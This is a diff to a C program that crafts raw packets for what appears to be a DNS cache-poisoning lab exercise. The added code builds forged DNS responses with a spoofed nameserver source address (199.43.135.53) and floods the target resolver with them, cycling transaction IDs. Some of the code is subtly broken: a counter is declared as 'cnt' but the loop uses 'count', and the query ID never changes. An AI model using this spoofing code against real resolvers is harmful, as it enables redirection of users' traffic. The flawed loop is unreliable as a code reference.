@@ -257,8 +257,7 @@ int main(int argc, char *argv[])
      ***************************************************************************************/
     
     // Source and destination addresses: IP and port
-//  struct sockaddr_in sin, din;
-    struct sockaddr_in sin;
+    struct sockaddr_in sin, din;
     int one = 1;
     const int *val = &one;
     dns->query_id=rand(); // transaction ID for the query packet, use random #
@@ -271,47 +270,68 @@ int main(int argc, char *argv[])
 
     // The source is redundant, may be used later if needed
     // The address family
-    sin.sin_family = AF_INET;
-//  din.sin_family = AF_INET;
+    sin.sin_family = AF_INET;   // Request
+    din.sin_family = AF_INET;   // Response
 
     // Port numbers
-    sin.sin_port = htons(33333);
-//  din.sin_port = htons(53);
+    sin.sin_port = htons(33333);    // Request
+    din.sin_port = htons(53);   // Response
 
     // IP addresses
     sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program
-//  din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program
+    din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program
 
-    // *** IP HEADER ***
-    // Fabricate the IP header or we can use the standard header structures but assign our own values.
+    
+// *** IP HEADER ***
+    // REQUEST
     ip->iph_ihl = 5;
     ip->iph_ver = 4;
     ip->iph_tos = 0; // Low delay
-
     unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd));
     ip->iph_len=htons(packetLength);
     ip->iph_ident = htons(rand()); // give a random number for the identification#
     ip->iph_ttl = 110; // hops
     ip->iph_protocol = 17; // UDP
-
     // Source IP address, can use spoofed address here!!!
     ip->iph_sourceip = inet_addr(argv[1]);
-
     // The destination IP address
     ip->iph_destip = inet_addr(argv[2]);
+        
+    // RESPONSE
+    ip_res->iph_ihl = 5;
+    ip_res->iph_ver = 4;
+    ip_res->iph_tos = 0; // Low delay
+    unsigned short int packetLength_res =(sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + length_res + sizeof(struct dataEnd));
+    ip_res->iph_len=htons(packetLength_res);
+    ip_res->iph_ident = htons(rand()); // give a random number for the identification#
+    ip_res->iph_ttl = 110; // hops
+    ip_res->iph_protocol = 17; // UDP
+    // Source IP address, can use spoofed address here!!!
+    ip_res->iph_sourceip = inet_addr("199.43.135.53");
+    // The destination IP address
+    ip_res->iph_destip = inet_addr(argv[2]);    
     
-    
-    // *** UDP HEADER ***
-    // Fabricate the UDP header. Source port number, redundant
-    udp->udph_srcport = htons(33333);  // source port number. remember the lower number may be reserved
-    
-    // Destination port number
+
+// *** UDP HEADER ***
+    // Request
+    udp->udph_srcport = htons(40000+rand()%10000);
     udp->udph_destport = htons(53);
     udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd));
+    
+    // Response
+    udp_res->udph_srcport = htons(33333);
+    udp_res->udph_destport = htons(53);
+    udp_res->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length_res+sizeof(struct dataEnd));    
+    
 
-    // Calculate the checksum for integrity
+// *** Checksum ***
+    // Request
     ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
     udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
+    
+    // Response
+    ip_res->iph_chksum = csum((unsigned short *)buffer_res, sizeof(struct ipheader) + sizeof(struct udpheader));
+    udp_res->udph_chksum=check_udp_sum(buffer_res, packetLength_res-sizeof(struct ipheader));    
     
     /*******************************************************************************8
       Tips
@@ -346,14 +366,22 @@ int main(int argc, char *argv[])
         int charnumber;
         charnumber=1+rand()%5;
         *(data+charnumber)+=1;
+        *(data_res+charnumber)+=1;        
 
         udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
 
         // send the packet out.
         if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
             printf("packet send error %d which means %s\n",errno,strerror(errno));
-        sleep(0.9);        
-        responsePacket(sd, argv[2]);
+
+        unsigned short int cnt = 65535; // count
+        while(count--){
+            dns_res->query_id=cnt;
+            udp_res->udph_chksum=check_udp_sum(buffer_res, packetLength_res-sizeof(struct ipheader));
+            
+            if(sendto(sd, buffer_res, packetLength_res, 0, (struct sockaddr *)&din, sizeof(din)) < 0)
+                printf("packet send error %d which means %s\n",errno,strerror(errno));
+        }
     }
     close(sd);
     return 0;
